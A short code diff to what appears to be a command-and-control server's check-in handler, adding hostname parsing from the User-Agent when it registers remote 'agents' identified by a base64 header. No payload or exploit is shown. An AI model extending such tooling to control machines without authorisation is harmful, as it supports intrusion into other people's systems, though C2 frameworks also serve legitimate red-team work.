@@ -30,12 +30,13 @@ def commander():
     b64 = base64.b64decode(request.headers.get("X-Client-Data"))
     uuid = b64.decode('utf-8')
     if request.method == 'GET':
-        raw_profile = request.headers.get("User-Agent").split("/", 1)
+        raw_profile = request.headers.get("User-Agent").split("/", 3)
         profile = raw_profile[0]
+        hostname = raw_profile[2]
         ip = request.remote_addr
         cache = r.lindex(uuid, -1)
         if r.exists(uuid) == 0:
-            command = register_agent(uuid, profile, ip)
+            command = register_agent(uuid, profile, ip, hostname)
 
         elif "SEEN" in cache or "AGENT REGISTERED" in cache:
             update_seen(uuid)
